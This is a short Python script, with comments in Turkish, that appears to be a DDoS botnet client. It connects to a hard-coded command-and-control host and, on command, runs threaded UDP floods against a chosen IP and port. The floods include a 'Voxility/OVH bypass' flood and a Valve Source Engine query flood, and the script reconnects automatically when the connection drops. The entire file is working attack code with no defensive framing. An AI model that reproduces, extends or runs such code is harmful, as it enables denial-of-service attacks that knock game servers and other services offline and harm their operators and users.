import socket
import threading
import time
import sys
import random
import os

# --- BAĞLANTI AYARLARI ---
# Argüman gelmezse Playit adresini varsayılan yapar
HOST = sys.argv[1] if len(sys.argv) > 1 else "usb-metallic.gl.joinmc.link"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 25565

def voxility_flood(target_ip, target_port, duration):
    """Voxility & OVH Bypass UDP Flood"""
    timeout = time.time() + int(duration)
    target = (target_ip, int(target_port))
    # Voxility'yi kandırmak için sahte protokol başlığı
    payload = b"\x58\x50\x4c\x44" + os.urandom(1020)
    
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(payload, target)
        except:
            pass

def vse_flood(target_ip, target_port, duration):
    """Valve Source Engine Query Flood (A2S_INFO)"""
    timeout = time.time() + int(duration)
    target = (target_ip, int(target_port))
    # Valve motoru sorgu paketi
    payload = b"\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00"
    
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(payload, target)
        except:
            pass

def bot_engine():
    while True:
        try:
            # CNC'ye Bağlan
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            print(f"[*] Kislaya girildi: {HOST}:{PORT}")
            
            while True:
                data = s.recv(1024).decode().strip()
                if not data: break
                
                args = data.split()
                cmd = args[0].upper()

                if cmd == "UDP_VOX": # UDP_VOX <ip> <port> <sure>
                    threading.Thread(target=voxility_flood, args=(args[1], args[2], args[3]), daemon=True).start()
                
                elif cmd == "VSE": # VSE <ip> <port> <sure>
                    threading.Thread(target=vse_flood, args=(args[1], args[2], args[3]), daemon=True).start()
                
                elif cmd == "STOP":
                    # Botun kendisini kapatmaz, sadece thread'lerin bitmesini bekler (veya ek önlem eklenebilir)
                    print("[!] Saldiri durduruluyor...")
                    
                elif cmd == "PING":
                    s.send(b"PONG")
            
        except Exception as e:
            print(f"[-] Baglanti koptu, 5sn sonra tekrar marş... ({e})")
            time.sleep(5)

if __name__ == "__main__":
    print(f"[*] Bot baslatildi. Hedef CNC: {HOST}:{PORT}")
    bot_engine()
